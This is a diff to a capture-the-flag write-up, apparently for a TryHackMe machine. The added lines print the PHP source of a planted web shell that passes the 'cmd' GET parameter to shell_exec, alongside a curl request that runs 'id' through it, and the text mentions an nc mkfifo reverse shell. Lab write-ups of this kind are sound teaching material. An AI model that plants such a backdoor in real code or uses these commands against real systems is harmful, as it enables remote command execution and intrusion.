@@ -278,6 +278,20 @@ dWlkPTMzKHd3dy1kYXRhKSBnaWQ9MzMod3d3LWRhdGEpIGdyb3Vwcz0zMyh3d3ctZGF0YSkK%
 ❯ curl -s "http://ua.thm/assets/index.php?cmd=id" | base64 -d
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
+This PHP script is vulnerable to **command injection** via the `cmd` GET parameter.
+
+### PHP Code in `index.php`
+```php
+<?php
+        $value = " ";
+        session_start();
+        if (isset($_GET['cmd'])){
+           $value = shell_exec($_GET['cmd']); 
+           echo base64_encode( $value);
+        }
+?>
+
+
 ## Exploitation
 > i use `nc mkfifo` found in revshell.com with URL encoded 
 
